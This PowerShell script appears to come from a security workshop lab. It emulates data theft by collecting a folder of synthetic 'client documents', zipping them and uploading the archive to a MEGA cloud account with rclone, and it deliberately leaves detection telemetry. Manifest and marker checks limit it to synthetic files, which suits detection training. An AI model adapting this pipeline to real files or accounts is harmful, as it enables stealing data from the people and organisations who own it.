# Manually staged and bounded transfer of manifest-verified synthetic files.
[CmdletBinding()]
param(
    [switch]$ValidateOnly,
    [switch]$StageOnly,
    [switch]$AddNoise
)

$ErrorActionPreference = 'Stop'
$root = Join-Path $env:LOCALAPPDATA 'CSWorkshop'
$docs = Join-Path $root 'ClientDocuments'
$marker = Join-Path $root '.synthetic-only'
$manifest = Join-Path $root 'dataset-manifest.csv'
$signature = 'CSWORKSHOP-SYNTHETIC-ONLY'
$config = Join-Path $root 'rclone.conf'
$verify = Join-Path $PSScriptRoot 'verify-tree.ps1'
$verifyInventory = Join-Path $PSScriptRoot 'verify-remote-inventory.ps1'
$ensureRclone = Join-Path $PSScriptRoot 'ensure-rclone.ps1'

if (-not (Test-Path -LiteralPath $marker) -or
    (Get-Content -LiteralPath $marker -Raw).Trim() -ne $signature) {
    throw 'Missing synthetic dataset marker. Run prepare.ps1 first.'
}
if (-not (Test-Path -LiteralPath $docs) -or -not (Test-Path -LiteralPath $manifest)) {
    throw 'Missing synthetic documents or dataset manifest.'
}
$count = & $verify -Tree $docs -Manifest $manifest
Write-Host "[OK] Dataset validated: $count synthetic files"
if ($ValidateOnly) { return }
if (-not $StageOnly -and (-not $env:MEGA_EMAIL -or -not $env:MEGA_PASSWORD)) {
    throw 'MEGA_EMAIL and MEGA_PASSWORD must be set in this PowerShell session.'
}
if (-not $StageOnly -and ($env:MEGA_EMAIL -match '[\r\n]' -or $env:MEGA_PASSWORD -match '[\r\n]')) {
    throw 'Newline characters are not allowed in lab account values.'
}
if (-not $StageOnly -and $env:COMPUTERNAME -notmatch '^[A-Za-z0-9_-]{1,63}$') {
    throw 'Computer name is not safe for the recorded remote path.'
}

$run = (Get-Date -Format 'yyyyMMdd-HHmmss') + '-' + [guid]::NewGuid().ToString('N').Substring(0, 6)
$staging = Join-Path $root "staging-$run"
$archive = Join-Path $root "client-data-$run.zip"
$log = Join-Path $root "transfer-$run.log"
$probe = Join-Path $root "probe-$run.txt"
$remoteDir = "workshopmega:CSWorkshop/$env:COMPUTERNAME/$run"
$runDir = Join-Path $root 'runs'
New-Item -ItemType Directory -Path $runDir -Force | Out-Null
$runFile = Join-Path $runDir "$run.json"

# Bounded deliberate operator error, no external systems are touched.
if ($AddNoise) {
    Write-Host '[+] Simulating a failed collection from a nonexistent local path'
    $missing = Join-Path $root 'Old-Client-Share'
    & robocopy.exe $missing (Join-Path $root "abandoned-$run") /E /R:0 /W:0 | Out-Null
    Write-Host "[+] Robocopy failed as expected (exit $LASTEXITCODE)"
}

# Leaves command-line telemetry and a recoverable file listing.
$cmdLine = 'dir /s /b "' + $docs + '"'
& cmd.exe /d /c $cmdLine 2>&1 |
    Out-File -LiteralPath (Join-Path $root "discovery-$run.txt") -Encoding UTF8

Write-Host '[+] Collecting files with Robocopy'
& robocopy.exe $docs $staging /E /XJ /R:0 /W:0 | Out-Host
if ($LASTEXITCODE -ge 8) { throw 'Document staging failed.' }
& $verify -Tree $staging -Manifest $manifest | Out-Null
Write-Host '[OK] Staged files match the synthetic manifest'

Write-Host '[+] Creating ZIP archive with Tar'
& tar.exe -a -cf $archive -C $staging .
if ($LASTEXITCODE -ne 0) { throw 'Archive creation failed.' }
$archiveCheck = Join-Path $root "archive-check-$run"
try {
    Expand-Archive -LiteralPath $archive -DestinationPath $archiveCheck
    & $verify -Tree $archiveCheck -Manifest $manifest | Out-Null
}
catch {
    if (Test-Path -LiteralPath $archive) { Remove-Item -LiteralPath $archive -Force }
    throw
}
finally {
    if (Test-Path -LiteralPath $archiveCheck) {
        Remove-Item -LiteralPath $archiveCheck -Recurse -Force
    }
}
Write-Host '[OK] Archive contents match the synthetic manifest'
if ($StageOnly) {
    Write-Host "[OK] Offline staging complete: $archive"
    return
}

$rclone = & $ensureRclone -Root $root
& $rclone version | Out-Host
if ($LASTEXITCODE -ne 0) { throw 'Rclone execution failed. Review EDR prevention.' }

# Obfuscation prevents casual display, but it is not credential encryption.
$obscured = ($env:MEGA_PASSWORD | & $rclone obscure -)
if ($LASTEXITCODE -ne 0 -or -not $obscured) { throw 'Rclone password setup failed.' }
$content = @"
[workshopmega]
type = mega
user = $env:MEGA_EMAIL
pass = $obscured
use_https = true
"@
[System.IO.File]::WriteAllText(
    $config, $content, [System.Text.UTF8Encoding]::new($false)
)

$hash = (Get-FileHash -LiteralPath $archive -Algorithm SHA256).Hash
$meta = [pscustomobject]@{
    RunId = $run
    Host = $env:COMPUTERNAME
    RemoteDir = $remoteDir
    ArchiveSha256 = $hash
    ArchiveBytes = (Get-Item -LiteralPath $archive).Length
    ProbeUploaded = $false
    Uploaded = $false
    TimestampUtc = [datetime]::UtcNow.ToString('o')
}
$meta | ConvertTo-Json | Set-Content -LiteralPath $runFile -Encoding UTF8
Set-Content -LiteralPath (Join-Path $root 'last-run.txt') -Value $run -Encoding ASCII
Set-Content -LiteralPath $probe -Value ($signature + [Environment]::NewLine + "Synthetic probe for run $run") -Encoding ASCII

Write-Host '[+] Uploading small probe'
& $rclone --config $config copyto $probe "$remoteDir/probe.txt" --log-level INFO --log-file $log
if ($LASTEXITCODE -ne 0) { throw "Probe upload failed; check $log" }
$meta.ProbeUploaded = $true
$meta | ConvertTo-Json | Set-Content -LiteralPath $runFile -Encoding UTF8

Write-Host '[+] Uploading synthetic archive to MEGA'
if ((Get-FileHash -LiteralPath $archive -Algorithm SHA256).Hash -ne $hash) {
    throw 'Archive changed after content verification; refusing transfer.'
}
& $rclone --config $config copyto $archive "$remoteDir/client-data.zip" --log-level INFO --log-file $log
if ($LASTEXITCODE -ne 0) { throw "Archive upload failed; check $log" }

$listing = @(& $rclone --config $config lsjson $remoteDir --recursive --no-mimetype --no-modtime)
if ($LASTEXITCODE -ne 0) { throw 'Remote listing failed.' }
& $verifyInventory -InventoryJson ($listing -join [Environment]::NewLine) -ArchiveBytes $meta.ArchiveBytes -RequireArchive | Out-Null
$meta.Uploaded = $true
$meta | ConvertTo-Json | Set-Content -LiteralPath $runFile -Encoding UTF8

Write-Host "[OK] Run ID: $run"
Write-Host "[OK] Remote: $remoteDir"
Write-Host "[OK] Archive SHA256: $hash"
Write-Host "[OK] Run metadata: $runFile"
